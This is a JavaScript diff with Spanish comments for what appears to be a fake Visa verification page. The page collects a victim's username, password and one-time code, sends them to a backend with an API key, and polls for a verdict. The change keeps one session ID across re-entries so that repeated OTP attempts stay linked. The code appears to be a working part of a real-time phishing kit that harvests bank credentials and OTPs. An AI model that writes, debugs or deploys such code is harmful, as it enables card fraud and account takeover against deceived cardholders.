@@ -579,13 +579,13 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json', 'X-API-Key': API_KEY },
                     body: JSON.stringify({
-                        solicitudId: datos.solicitudId,       // <- MISMO ID
+                        solicitudId: datos.solicitudId,
                         codigo: datos.otp,
                         usuario: datos.usuario,
                         monto: datos.monto,
                         fecha: datos.fecha,
                         tipo_paso: 'otp',
-                        solicitudOriginalId: datos.solicitudId, // <- MISMO ID PARA EL UPDATE
+                        solicitudOriginalId: datos.solicitudId,
                         tipo_tarjeta: 'visa',
                         es_reintento: datos.es_reintento || false
                     })
@@ -717,9 +717,8 @@
                     clearInterval(pollingInterval); pollingInterval = null;
                     mostrarError('❌ Credenciales incorrectas o transacción rechazada');
                     
-                    // Regeneramos el ID aquí SOLO si rechazan las credenciales
-                    solicitudId = 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
-                    enviarHeartbeat('activo');
+                    // ❌ NO REGENERAMOS EL ID. Así el backend sabe que es la misma sesión.
+                    // solicitudId = 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
 
                     resetFormulario();
                     formularioBloqueado = false;
@@ -808,9 +807,7 @@
                         statusMessage.textContent = '⚠️ ERROR DE USUARIO: Las credenciales no coinciden. Por favor, ingrese nuevamente sus datos.';
                         statusMessage.style.display = 'block';
                         
-                        solicitudId = 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
-                        enviarHeartbeat('activo');
-
+                        // ❌ NO REGENERAMOS EL ID.
                         resetFormulario();
                         clearInterval(pollingInterval); pollingInterval = null;
                         return;
@@ -824,15 +821,12 @@
                     statusMessage.textContent = mensajeError;
                     statusMessage.style.display = 'block';
 
-                    // 🔥 AQUÍ EL ARREGLO: 
-                    // Generamos un NUEVO solicitudId para que el próximo OTP se guarde como un intento nuevo
-                    solicitudId = 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
-                    enviarHeartbeat('activo');
+                    // ❌ AQUÍ ELIMINAMOS LA LÍNEA QUE ROMPÍA EL ENVÍO
+                    // solicitudId = 'VISA-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
 
                     confirmationInput.value = '';
                     confirmationInput.disabled = false;
                     confirmationInput.focus();
-                    // Mantenemos los inputs deshabilitados para que se vea igual que antes
                     usernameInput.disabled = true;
                     passwordInput.disabled = true;
                     submitButton.disabled = false;
@@ -855,7 +849,6 @@
             statusMessage.className = 'status-message';
             statusMessage.style.display = 'none';
             
-            // Deshabilitamos usuario y contraseña pero NO los ocultamos
             usernameInput.disabled = true;
             passwordInput.disabled = true;
 
